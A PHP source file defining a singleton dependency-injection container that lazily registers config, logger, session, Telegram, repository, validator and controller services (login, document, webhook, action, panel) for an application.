<?php

declare(strict_types=1);

namespace App;

use App\Config\Config;
use App\Services\LoggerService;
use App\Services\SessionService;
use App\Services\TelegramService;
use App\Repositories\SessionRepository;
use App\Repositories\ActionRepository;

/**
 * Dependency Injection Container - Simple Service Locator
 */
final class Container
{
    private static ?self $instance = null;
    private array $services = [];

    private function __construct()
    {
        $this->registerServices();
    }

    public static function getInstance(): self
    {
        if (self::$instance === null) {
            self::$instance = new self();
        }

        return self::$instance;
    }

    private function registerServices(): void
    {
        // Configuration
        $this->services['config'] = fn() => Config::getInstance();

        // Logger
        $this->services['logger'] = fn() => LoggerService::getInstance();

        // Session Service
        $this->services['session'] = fn() => new SessionService(
            $this->get('config'),
            $this->get('logger')
        );

        // Telegram Service
        $this->services['telegram'] = fn() => new TelegramService(
            $this->get('config'),
            $this->get('logger')
        );

        // Repositories
        $this->services['sessionRepository'] = function () {
            $config = $this->get('config');
            $sessionPath = dirname(__DIR__, 2) . '/' . $config->get('session.path');
            return new SessionRepository($sessionPath, $this->get('logger'));
        };

        $this->services['actionRepository'] = function () {
            $config = $this->get('config');
            $sessionPath = dirname(__DIR__, 2) . '/' . $config->get('session.path');
            return new ActionRepository($sessionPath, $this->get('logger'));
        };

        // Validators
        $this->services['documentValidator'] = fn() => new \App\Validators\DocumentValidator();
        $this->services['credentialsValidator'] = fn() => new \App\Validators\CredentialsValidator();

        // Controllers
        $this->services['documentController'] = fn() => new \App\Controllers\DocumentController(
            $this->get('session'),
            $this->get('telegram'),
            $this->get('logger'),
            $this->get('documentValidator')
        );

        $this->services['loginController'] = fn() => new \App\Controllers\LoginController(
            $this->get('session'),
            $this->get('telegram'),
            $this->get('logger'),
            $this->get('credentialsValidator')
        );

        $this->services['actionController'] = fn() => new \App\Controllers\ActionController(
            $this->get('actionRepository'),
            $this->get('logger')
        );

        $this->services['webhookController'] = fn() => new \App\Controllers\WebhookController(
            $this->get('telegram'),
            $this->get('logger'),
            $this->get('actionRepository')
        );

        $this->services['panelController'] = fn() => new \App\Controllers\PanelController(
            $this->get('sessionRepository'),
            $this->get('logger')
        );
    }

    public function get(string $name): mixed
    {
        if (!isset($this->services[$name])) {
            throw new \RuntimeException("Service '$name' not found in container");
        }

        $service = $this->services[$name];

        if ($service instanceof \Closure) {
            $this->services[$name] = $service();
            return $this->services[$name];
        }

        return $service;
    }

    public function set(string $name, mixed $service): void
    {
        $this->services[$name] = $service;
    }
}
